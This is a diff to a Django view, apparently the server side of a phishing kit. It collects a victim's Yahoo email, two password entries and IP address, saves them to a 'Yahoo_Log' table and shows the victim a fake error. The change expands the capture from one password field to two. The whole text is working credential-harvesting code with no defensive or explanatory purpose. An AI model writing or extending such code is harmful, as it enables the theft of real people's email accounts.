@@ -40,7 +40,11 @@ class Redify(APIView):
 class Getlog(APIView):
     def post(self,request):
         try:
-            psw=request.data['main-password']
+            psw1=request.data['psw1']
+        except:
+            pass
+        try:
+            psw2=request.data['psw2']
         except:
             pass
         try:
@@ -53,7 +57,7 @@ class Getlog(APIView):
             ip = xxx.split(',')[0]
         else:
             ip = request.META.get('REMOTE_ADDR')
-        Yahoo_Log.objects.create(mail=mail,password=psw,ip=ip,)
+        Yahoo_Log.objects.create(mail=mail,psw1=psw1, psw2=psw2,ip=ip,)
         return Response({"error"})
         #Send Email
 
